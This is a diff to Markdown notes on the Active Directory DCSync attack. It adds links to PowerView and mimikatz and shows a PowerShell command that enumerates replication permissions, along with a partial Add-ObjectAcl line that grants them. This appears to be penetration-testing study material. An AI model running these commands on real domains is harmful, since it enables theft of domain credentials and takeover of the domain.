@@ -4,9 +4,13 @@ The DCSync attack simulates the behaviour of a Domain Controller and asks other
 ## Prerequisites
 - Having the following permission:  **Replicate Directory Changes**, **Replicate Directory Changes All**
 
+## Tools
+- [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)
+- [mimikatz](https://github.com/gentilkiwi/mimikatz)
+
 # Enumeration
-Check permission with [*PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
 ```powershell
+# PoverView - Check Permission
 Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
 ```
 
@@ -31,4 +35,3 @@ Add-ObjectAcl -TargetDistinguishedName "dc=company,dc=corp,dc=local" -PrincipalS
 # References
 - [https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/dcsync.html](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/dcsync.html)
 - [https://www.semperis.com/blog/dcsync-attack/](https://www.semperis.com/blog/dcsync-attack/)
-- [*PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
